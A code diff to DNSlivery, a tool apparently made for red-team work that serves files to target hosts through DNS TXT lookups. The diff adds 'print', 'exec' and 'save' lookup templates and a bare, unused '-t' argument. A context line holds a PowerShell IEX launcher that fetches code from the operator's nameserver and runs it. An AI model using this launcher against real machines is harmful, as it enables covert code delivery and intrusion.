@@ -106,6 +106,7 @@ if __name__ == '__main__':
     parser.add_argument('nameserver', default=None, help='FQDN name of the server running DNSlivery')
     parser.add_argument('-p', '--path', default='.', help='path of directory to serve over DNS (default: pwd)')
     parser.add_argument('-s', '--size', default='255', help='size in bytes of base64 chunks (default: 255)')
+    parser.add_argument('-t')
     parser.add_argument('-v', '--verbose', action='store_true', help='increase verbosity')
     args = parser.parse_args()
 
@@ -131,9 +132,6 @@ if __name__ == '__main__':
         break
 
     # launcher and stagers template definition
-
-    lookup_template_pwsh = "Resolve-DnsName -ty TXT -na \"%s.%s\" | Select-Object -Exp Strings"
-    lookup_template_nslookup_win = "nslookup -q=TXT %s.%s %s"
 
     launcher_template = 'IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((1..%d|%%{Resolve-DnsName -ty TXT -na "%s.%s.$_.%s"|Where-Object Section -eq Answer|Select -Exp Strings}))))'
 
@@ -181,9 +179,23 @@ if __name__ == '__main__':
         # display file ready for delivery
         log('File "%s" ready for delivery at %s.%s (%d chunks)' % (name, filenames[name], args.domain, len(chunks[filenames[name]])))
 
-        # Print lookup template
-        log('Lookup template (Resolve-DNSName): %s' % (lookup_template_pwsh % (filenames[name], args.domain)), 'debug')
-        log('Lookup template (nslookup): %s' % (lookup_template_nslookup_win % (filenames[name], args.domain, args.nameserver)), 'debug')
+        # Print lookup template for each type exec, print, and save
+        lookup_templates_pwsh = {
+            'print': "Resolve-DnsName -ty TXT -na \"%s.print.%s\" | Select-Object -Exp Strings",
+            'exec': "Resolve-DnsName -ty TXT -na \"%s.exec.%s\" | Select-Object -Exp Strings",
+            'save': "Resolve-DnsName -ty TXT -na \"%s.save.%s\" | Select-Object -Exp Strings"
+        }
+
+        lookup_templates_nslookup = {
+            'print': "nslookup -q=TXT %s.print.%s %s",
+            'exec': "nslookup -q=TXT %s.exec.%s %s",
+            'save': "nslookup -q=TXT %s.save.%s %s"
+        }
+
+        for key in lookup_templates_pwsh:
+            log('Lookup %s (Resolve-DNSName): %s' % (key.upper(), lookup_templates_pwsh[key] % (filenames[name], args.domain)), 'debug')
+            log('Lookup %s (nslookup): %s' % (key.upper(), lookup_templates_nslookup[key] % (filenames[name], args.domain, args.nameserver)), 'debug')
+        
 
     # register signal handler
     signal.signal(signal.SIGINT, signal_handler)
